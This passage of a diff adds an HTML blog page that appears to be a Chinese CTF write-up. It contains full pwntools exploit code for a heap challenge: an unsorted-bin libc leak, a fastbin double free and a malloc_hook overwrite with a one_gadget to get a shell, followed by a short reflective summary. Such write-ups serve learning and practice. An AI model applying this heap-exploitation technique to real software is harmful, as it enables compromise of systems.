+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sentence</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter the word size:"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">word</span><span class="p">)))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter the word:"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">word</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">leak_bins</span><span class="p">():</span>
+    <span class="n">contain</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x85</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="s">'b'</span>
+    <span class="n">add_sentence</span><span class="p">(</span><span class="n">contain</span><span class="p">)</span>
+    <span class="n">search</span><span class="p">(</span><span class="s">'b'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">search</span><span class="p">(</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Found 135: "</span><span class="p">)</span>
+    <span class="n">unsorted_bin</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"unsorted_bin -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">unsorted_bin</span><span class="p">))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'n'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">unsorted_bin</span>
+
+<span class="k">def</span> <span class="nf">main_arena_offset</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mi">4</span>          <span class="c1"># lock
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">4</span>         <span class="c1"># flag
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">10</span>    <span class="c1"># fastbins
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">8</span>     <span class="c1"># top and lastremainder
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">index</span> <span class="c1"># bins[NBINS * 2 -2]
+</span>    <span class="n">offset</span> <span class="o">-=</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">2</span>     <span class="c1"># offset to chunk head
+</span>    <span class="k">return</span> <span class="n">offset</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">unsorted_bin</span> <span class="o">=</span> <span class="n">leak_bins</span><span class="p">()</span>
+    <span class="n">main_arena_addr</span> <span class="o">=</span> <span class="n">unsorted_bin</span> <span class="o">-</span> <span class="n">main_arena_offset</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"main_arena_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena_addr</span><span class="p">))</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="n">main_arena_addr</span> <span class="o">-</span> <span class="n">main_arena_libc</span>
+    
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0xf1147</span> <span class="o">+</span> <span class="n">offset</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"one_gadget -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+    <span class="c1"># double free
+</span>    <span class="c1"># malloc 3 fastbins c-&gt;b-&gt;a
+</span>    <span class="n">add_sentence</span><span class="p">(</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x5e</span> <span class="o">+</span> <span class="s">' d'</span><span class="p">)</span>   <span class="c1"># a 0x60
+</span>    <span class="n">add_sentence</span><span class="p">(</span><span class="s">"b"</span><span class="o">*</span><span class="mh">0x5e</span> <span class="o">+</span> <span class="s">' d'</span><span class="p">)</span>   <span class="c1"># b 0x60
+</span>    <span class="n">add_sentence</span><span class="p">(</span><span class="s">"c"</span><span class="o">*</span><span class="mh">0x5e</span> <span class="o">+</span> <span class="s">' d'</span><span class="p">)</span>   <span class="c1"># c 0x60
+</span>
+    <span class="c1"># free all, now fastbins links a-&gt;b-&gt;c
+</span>    <span class="n">search</span><span class="p">(</span><span class="s">"d"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+
+    <span class="c1"># free b, b-&gt;a-&gt;b
+</span>    <span class="n">search</span><span class="p">(</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'n'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'n'</span><span class="p">)</span>
+
+    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">main_arena_addr</span> <span class="o">-</span> <span class="mh">0x33</span>
+    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s">'x'</span><span class="p">)</span>
+    <span class="n">add_sentence</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>
+
+    <span class="n">add_sentence</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x60</span><span class="p">)</span>
+    <span class="n">add_sentence</span><span class="p">(</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x60</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s">'x'</span><span class="p">)</span>
+    <span class="c1"># gdb.attach(sh)
+</span>    <span class="n">add_sentence</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="总结">总结</h3>
+<hr />
+<p>  这个题目很复杂，我们主要用到了uaf，double free，实现了任意写的效果，最后通过覆写malloc_hook来getshell，里面的一些细节需要注意，比如如何根据unsorted-bin计算main_arena进而获得offset。还有循环链表的构造方式，感觉除了刷题很难有手感。<br />
+  总之今天学到了很多知识。</p>
+
+
+</div>
+  </main>
+
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>dyf</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+
+</div><small id="attribution">
+    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
+  </small>
+  
+</footer>
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+
+</body>
+
+</html>
